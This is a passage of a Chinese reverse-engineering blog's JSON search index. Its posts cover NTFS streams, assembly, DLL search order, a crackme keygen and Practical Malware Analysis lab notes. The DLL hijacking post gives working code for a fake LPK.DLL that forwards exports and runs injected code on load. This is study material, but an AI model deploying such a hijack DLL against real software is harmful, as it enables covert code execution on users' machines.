的shell,在linux主机上就可以直接操作了。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"数据隐藏-ADS","slug":"数据隐藏-ADS","date":"2017-08-05T16:00:00.000Z","updated":"2023-07-27T14:32:58.787Z","comments":true,"path":"2017/08/06/数据隐藏-ADS/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-ADS/","excerpt":"NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。 详见ADS","text":"NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。 详见ADS","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"汇编知识学习","slug":"汇编知识学习","date":"2017-08-05T16:00:00.000Z","updated":"2017-08-06T09:19:27.284Z","comments":true,"path":"2017/08/06/汇编知识学习/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/","excerpt":"1.MOVSX 带符号扩展指令 MOV BL,80H MOVSX AX,BL AX=0FF80H 因为带符号扩展的时候，高位视为符号位，扩展的高位全置1 2.neg eax sbb eax ,eax 例如 neg r sbb r-r neg eax 就是0-eax 其实际上就是设置标志位 cf=1 sbb eax,eax 就是eax-eax-cf 如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1 相当于r-r-cf=-1=oxffffffff 注意： MOVzX 无符号扩展指令 3.test 指令 test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je xxxx 4.__alloca_probe 逆向vc编译的程序，经常会看到这样的代码出现在函数头部： mov eax, xxxxh call __alloca_probe xxxxh是个立即数，一般大于1000h,即十进制数4096。 这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。 示例1： push ebp mov ebp, esp mov eax, 8080h call __alloca_probe 示例2： push ebp mov ebp, esp and esp, 0FFFFFFF8h push 0FFFFFFFFh push offset SEH_4A7AA0 mov eax, large fs:0 push eax mov large fs:0, esp push ecx mov eax, 8080h call __alloca_probe 事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。 5.chkstk函数 分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间 我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h, eax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。","text":"1.MOVSX 带符号扩展指令 MOV BL,80H MOVSX AX,BL AX=0FF80H 因为带符号扩展的时候，高位视为符号位，扩展的高位全置1 2.neg eax sbb eax ,eax 例如 neg r sbb r-r neg eax 就是0-eax 其实际上就是设置标志位 cf=1 sbb eax,eax 就是eax-eax-cf 如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1 相当于r-r-cf=-1=oxffffffff 注意： MOVzX 无符号扩展指令 3.test 指令 test eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je xxxx 4.__alloca_probe 逆向vc编译的程序，经常会看到这样的代码出现在函数头部： mov eax, xxxxh call __alloca_probe xxxxh是个立即数，一般大于1000h,即十进制数4096。 这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。 示例1： push ebp mov ebp, esp mov eax, 8080h call __alloca_probe 示例2： push ebp mov ebp, esp and esp, 0FFFFFFF8h push 0FFFFFFFFh push offset SEH_4A7AA0 mov eax, large fs:0 push eax mov large fs:0, esp push ecx mov eax, 8080h call __alloca_probe 事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。 5.chkstk函数 分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间 我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h, eax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。 6.JGE.JLE,JNE,JE跳转条件 JGE 大于等于跳转，JLE小于等于跳转，JNE不等于跳转，JE 前等于后跳转 7.字符串入栈的操作： void main()&#123; 01361000 push ebp 01361001 mov ebp,esp 01361003 sub esp,0Ch //栈顶抬高12个字节 01361006 mov eax,dword ptr [___security_cookie (1363000h)] 0136100B xor eax,ebp 0136100D mov dword ptr [ebp-4],eax //用了4个字节 int intA; char ch[5]=&quot;abcd&quot;; 01361010 mov eax,dword ptr [string &quot;abcd&quot; (136210Ch)] 01361015 mov cl,byte ptr ds:[1362110h] //两句传送字符串”abcd\\0”到寄存器 intA=15; fun(intA,ch); 0136101B lea edx,[ebp-0Ch] // 0136101E push edx //数组地址,ch[] 0136101F push 0Fh //立即数参数,15 01361021 push offset string &quot;Integer:%d String:%s&quot; (13620F4h) 01361026 mov dword ptr [ebp-0Ch],eax 01361029 mov byte ptr [ebp-8],cl //两句语句表示”abcd\\0”写入栈中 0136102C call dword ptr [__imp__printf (13620A0h)] //调用printf &#125; cl 这个赋值一直不太懂，后来知道了字符串要以00结尾才行，所以要再赋值cl为00，然后放在abcd的后面。 8.atoi 函数 字符串转变为数字","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"进程替换的一种方式","slug":"进程替换的一种检测方式","date":"2017-08-05T16:00:00.000Z","updated":"2023-07-27T14:32:35.833Z","comments":true,"path":"2017/08/06/进程替换的一种检测方式/","link":"","permalink":"http://zwjsfdbb.top/2017/08/06/%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/","excerpt":"进程替换问题 svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。","text":"进程替换问题 svchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"dll加载和劫持","slug":"dll加载和劫持","date":"2017-08-02T16:00:00.000Z","updated":"2023-07-27T14:33:50.161Z","comments":true,"path":"2017/08/03/dll加载和劫持/","link":"","permalink":"http://zwjsfdbb.top/2017/08/03/dll%E5%8A%A0%E8%BD%BD%E5%92%8C%E5%8A%AB%E6%8C%81/","excerpt":"一.dll加载顺序 DLL查找路径基础 &amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。 &amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载： &amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。） &amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。 &amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。 2.系统标准DLL查找顺序 &amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。 &amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下：","text":"一.dll加载顺序 DLL查找路径基础 &amp;emsp;&amp;emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。 &amp;emsp;&amp;emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载： &amp;emsp;&amp;emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。） &amp;emsp;&amp;emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。 &amp;emsp;&amp;emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个”找不到模块”的错误。 2.系统标准DLL查找顺序 &amp;emsp;&amp;emsp;系统使用的标准DLL查找顺序依赖于是否设置了”安全DLL查找模式”（safe DLL search mode）。”安全DLL查找模式”会将用户当前目录置于查找顺序的后边。“安全DLL查找模式”默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用”安全DLL查找模式”，并修改DLL查找顺序。Windows XP下，”安全DLL查找模式”默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。”安全DLL查找模式”从Windows XP SP2开始，默认是启用的。 &amp;emsp;&amp;emsp;启用”安全DLL查找模式”时，查找顺序如下： a . 应用程序所在目录； b. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；d. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；e. 当前目录。GetCurrentDirectory返回的目录；f. 环境变量PATH中所有目录。 如果”安全DLL查找模式”被禁用，查找顺序如下：a. 应用程序所在目录；b. 当前目录。GetCurrentDirectory返回的目录；c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；f. 环境变量PATH中所有目录。 修改系统DLL查找顺序系统使用的标准DLL查找顺序可以通过以下两种方式调整：3.1 使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数；这种方式调用LoadLibraryEx函数，需要设置lpFileName参数（绝对路径）。与标准查找策略不同的是，使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数的DLL查找顺序将”查找应用程序所在目录”修改为lpFileName指定的目录。3.2 调用SetDllDirectory函数。注意：SetDllDirectory函数在Windows XP SP1开始支持的。函数SetDllDirectory在调用参数lpPathName是一个路径时，可支持修改DLL搜索路径。修改之后的搜索顺序如下：a. 应用程序所在目录；b. 函数SetDllDirectory参数lpPathName给定的目录；c. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；d. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；e. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；f. 环境变量PATH中所有目录。如果lpPathName参数为空字符串，这样就会把当前目录从DLL搜索路径中去掉。如果用NULL参数调用SetDllDirectory函数，可以恢复按照系统注册表的”安全DLL查找模式”来查找DLL。 当然win8或者windows server 2012提供更多的可定制方法，这个可以参考MSDN上介绍。比如：SetDefaultDllDirectories、 AddDllDirectory、RemoveDllDirectory。 4.为了测试计算机系统的dll 加载顺序可以通过一个程序加载一个不存在的dll,然后用process monitor 来监控加载的行为。 #include &lt;windows.h&gt; #include &lt;iostream&gt; int main(int argc, char ** argv) &#123; using std::cout; using std::endl; // 随便设置一个不存在的dll名 HMODULE hMod = LoadLibrary(&quot;123.dll&quot;); if (NULL != hMod) FreeLibrary(hMod); cout &lt;&lt; &quot;LoadLibrary Test&quot; &lt;&lt; endl; return 0; &#125; 5.通过process monitor 实际测试win10 64位发现加载顺序是 • 应用程序所在目录 • 系统目录（首先是c:\\Windows\\SysWOW64；然后是c:\\Windows\\System） • windows目录 • 当前目录 • 环境变量path目录 二 dll 劫持 &amp;emsp;&amp;emsp;由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。 &amp;emsp;&amp;emsp;●DLL劫持的实现●这一步我们的工作就是通过编程来实现一个LPK.DLL文件，它与系统目录下的LPK.DLL导出表相同，并能加载系统目录下的LPK.DLL，并且能将导出表转发到真实的LPK.DLL。可以看出我们要实现的这个DLL需求如下： 1 、构造一个与系统目录下LPK.DLL一样的导出表； 2、加载系统目录下的LPK.DLL； 3、将导出函数转发到系统目录下的LPK.DLL上； 4、在初始化函数中加入我们要执行的代码。 我们使用VC++来进行开发，首先是定义导出函数。核心代码如下： #pragma comment(linker, &quot;/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1&quot;) #pragma comment(linker, &quot;/EXPORT:LpkTabbedTextOut=_gamehacker_LpkTabbedTextOut,@2&quot;) #pragma comment(linker, &quot;/EXPORT:LpkDllInitialize=_gamehacker_LpkDllInitialize,@3&quot;) #pragma comment(linker, &quot;/EXPORT:LpkDrawTextEx=_gamehacker_LpkDrawTextEx,@4&quot;) #pragma comment(linker, &quot;/EXPORT:LpkExtTextOut=_gamehacker_LpkExtTextOut,@6&quot;) #pragma comment(linker, &quot;/EXPORT:LpkGetCharacterPlacement= _gamehacker_LpkGetCharacterPlacement,@7&quot;) #pragma comment(linker, &quot;/EXPORT:LpkGetTextExtentExPoint=_gamehacker_LpkGetTextExtentExPoint,@8&quot;) #pragma comment(linker, &quot;/EXPORT:LpkPSMTextOut=_gamehacker_LpkPSMTextOut,@9&quot;) #pragma comment(linker, &quot;/EXPORT:LpkUseGDIWidthCache=_gamehacker_LpkUseGDIWidthCache,@10&quot;) #pragma comment(linker, &quot;/EXPORT:ftsWordBreak=_gamehacker_ftsWordBreak,@11&quot;) 以上是导出表中的函数，LPK.DLL比较特殊，在导入表中有一项不是函数是数据，因此数据这部分要单独处理。核心代码如下： ★ EXTERNC void __cdecl gamehacker_LpkEditControl(void); EXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = &#123;gamehacker_LpkEditControl&#125;; ★ LpkEditControl这个数组有14个成员，如上定义即可，后面我们还需要将真正的数据复制过来。加载系统目录下的LPK.DLL。核心代码如下： ★ inline BOOL WINAPI Load() { TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(“\\lpk”)); m_hModule&#x3D;LoadLibrary(tzPath); return (m_hModule !&#x3D; NULL); } ★在代码中可以看到，使用LoadLibrary方式加载系统目录下的LPK.DLL。加载完成后就要实现导出函数的转发了，这步是很关键的。首先要获得原函数地址。核心代码如下： ★ FARPROC WINAPI GetAddress(PCSTR pszProcName) &#123; FARPROC fpAddress; CHAR szProcName[16]; TCHAR tzTemp[MAX_PATH]; fpAddress = GetProcAddress(m_hModule, pszProcName); return fpAddress; &#125; ★ 然后将我们构造的导出函数一一转发。核心代码如下： ★ ALCDECL gamehacker_LpkInitialize(void) &#123; GetAddress(&quot;LpkInitialize&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkTabbedTextOut(void) &#123; GetAddress(&quot;LpkTabbedTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkDllInitialize(void) &#123; GetAddress(&quot;LpkDllInitialize&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkDrawTextEx(void) &#123; GetAddress(&quot;LpkDrawTextEx&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkEditControl(void) &#123; GetAddress(&quot;LpkEditControl&quot;); __asm jmp DWORD ptr [EAX]; &#125; ALCDECL gamehacker_LpkExtTextOut(void) &#123; GetAddress(&quot;LpkExtTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkGetCharacterPlacement(void) &#123; GetAddress(&quot;LpkGetCharacterPlacement&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkGetTextExtentExPoint(void) &#123; GetAddress(&quot;LpkGetTextExtentExPoint&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkPSMTextOut(void) &#123; GetAddress(&quot;LpkPSMTextOut&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_LpkUseGDIWidthCache(void) &#123; GetAddress(&quot;LpkUseGDIWidthCache&quot;); __asm JMP EAX; &#125; ALCDECL gamehacker_ftsWordBreak(void) &#123; GetAddress(&quot;ftsWordBreak&quot;); __asm JMP EAX; &#125; ★ 转发完之后不要忘记LpkEditControl哦，要将真实数据复制过来。核心代码如下：★ memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(“LpkEditControl”) + 1),52); ★好了，到这里整个DLL劫持基本就算完成了，也许你要问，那我们要执行的代码写在哪里？我的方法是将其写到初始化函数中。这样当DLL被加载的时候就会执行。下面看一下DLL的入口函数吧。 ★ BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved) &#123; if (dwReason == DLL_PROCESS_ATTACH) &#123; DisableThreadLibraryCalls(hModule); if(Load()) &#123; memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(&quot;LpkEditControl&quot;) + 1),52); _beginthread(Init,NULL,NULL); &#125; else return FALSE; &#125; else if (dwReason == DLL_PROCESS_DETACH) &#123; Free(); &#125; return TRUE; &#125; ★ 在这个函数中我们看到，当加载系统目录下的LPK.DLL成功后，进行了LpkEditControl数组的复制，并通过_beginthread(Init,NULL,NULL);定义了初始化函数Init，而这个初始化函数是由我们控制的。下面在初始化函数Init中写入测试代码如下： ★ void WINAPIV Init(LPVOID pParam); void WINAPIV Init(LPVOID pParam) &#123; TCHAR tzPath[MAX_PATH]; TCHAR tzTemp[MAX_PATH * 2]; wsprintf(tzTemp, TEXT(&quot;劫持函数运行了.......&quot;), tzPath); MessageBox(NULL, tzTemp, TEXT(&quot;gamehacker&quot;), MB_ICONSTOP); return; &#125; ★","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"一个简单的crackme","slug":"一个简单的crackme","date":"2017-07-31T16:00:00.000Z","updated":"2023-07-27T14:06:20.372Z","comments":true,"path":"2017/08/01/一个简单的crackme/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/","excerpt":"一、样本基本信息 程序链接 http://pan.baidu.com/s/1bSPUdK 二、分析过程 这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。 打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。 寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起， 继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，","text":"一、样本基本信息 程序链接 http://pan.baidu.com/s/1bSPUdK 二、分析过程 这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。 打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。 寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起， 继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc， 重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序， 程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80, 然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00, 然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235， 继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数__vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax&#x3D;0x31即ax&#x3D;31,最后得到edi的值为6*0x17cfb+0x31&#x3D;0x8ee13,然后程序调用__vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。 4.转化为c代码为： #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; #include&lt;string.h&gt; int main() { char name[10]; int len&#x3D;0,key&#x3D;0; scanf(“%s”,&amp;name); len&#x3D;strlen(name); key&#x3D;len*0x17cfb+name[0]; printf(“AKA-“); printf(“%d\\n”,key); system(“pause”); return 0; }","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"恶意代码分析第一记","slug":"恶意代码分析第一记","date":"2017-07-31T16:00:00.000Z","updated":"2023-07-27T14:31:54.200Z","comments":true,"path":"2017/08/01/恶意代码分析第一记/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%AE%B0/","excerpt":"一、样本基本信息 分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe 二、分析过程 首先在虚拟机里准备好必要的工具，静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。 动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。 静态分析步骤： • PEID 查壳 发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。 • PEVIew","text":"一、样本基本信息 分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe 二、分析过程 首先在虚拟机里准备好必要的工具，静态分析工具包括 PEView、strings、(IDA)、,Dependency Walkler、Resource Hacker、PEID、PEexplorer等。 动态分析工具包括process monitor,process explorer,ApateDNS,RegShot等。 静态分析步骤： • PEID 查壳 发现是个加壳程序，估计导入表和字符串应该看不到什么有用的信息了。 • PEVIew 抱着可能有意外之喜的心态，打开Peview,查看导入表，果不其然，只有一个ExitProcess函数, • Strings 用strings.exe程序查看字符串，发现字符串并没有被混淆，看到了很多字符串，其中vm32to64.exe看起来像是一个释放的可执行文件，后面的注册表SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run是启动项的位置，猜测程序添加了开机自启动。还有一个网址www.practicalmalwareanalysis.com 程序应该是有联网活动。其实导入表和字符串也可以通过IDA来看，总之方法很多。 ​ 动态分析步骤 首先运行process monitor、process explorer、ApateDNS、regshot等工具。然后运行样本程序，果然在ApateDNS中发现了联网活动。 在process monitor 中监控到了设置注册表启动的现象。注意要晓得哪些东西是系统正常的行为，即噪声，如图除了第二条其他都是噪声。在文件界面我们选择过滤创建文件和写入文件，如图发现了向vmx32to64.exe写文件的行为。此时要注意该程序的大小是否和样本的大小一致，判断是否是复制行为。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"恶意代码分析第二记","slug":"恶意代码分析第二记","date":"2017-07-31T16:00:00.000Z","updated":"2023-07-27T14:31:48.506Z","comments":true,"path":"2017/08/01/恶意代码分析第二记/","link":"","permalink":"http://zwjsfdbb.top/2017/08/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%AC%AC%E4%BA%8C%E8%AE%B0/","excerpt":"一、样本基本信息 .样本来源于恶意代码分析实战的第七章的实验样本lab07-03.exe,lab07-03.dll. 二、分析过程 首先查看下有什么关键字符串。strings.exe 程序查看lab07-03.exe 的字符串，发现有文件映射的一系列函数，CreateFileMappingA,UnmapViewOfFile,MapViewOfFile等，以及遍历文件的函数FindFirstFileA,FindNextFileA,FindClose,另外还有复制文件的函数和创建文件的函数等，没发现什么网络特征。再看下lab07-03.dll的字符串，首先是创建进程的函数CreateProcessA，然后是互斥体的函数CreateMutexA,OpenMutexA,等函数,此外发现了一些网络特征，ip地址 127.26.152.13，以及实现网络功能的库WS2_32.dll,还有一些字符串比较函数strcmp. 然后查看lab07-03.exe的导入表，可以看到前面所叙述的函数，同时应注意到，导入表中并没有LoadLibrary或者GetProcAddress函数，说明dll文件并没有在运行时加载。查看lab07-03.dll文件发现很多网络特征，很多网络函数，包括WSAStartup,socket,send,connect,recv等。 查看完这些后，心中稍微有点底，然后运行程序进行动态分析，配置网络环境ApateDNS,监控软件等。运行完程序发现秒退，什么也没有发生，process monitor和process explorer也什么没监控到，也没什么网络活动。猜测可能会有命令行参数。对lab07-03.exe进行逆向分析。载入IDA，进入主函数，发现果然有验证，判断参数是否为2，并且第二个参数是否“WARNING_THIS_WILL_DESTROY_YOUR_MACHINE”然后下面就是文件映射的操作了，对’C:\\Windows\\System32\\Kernel32.dll 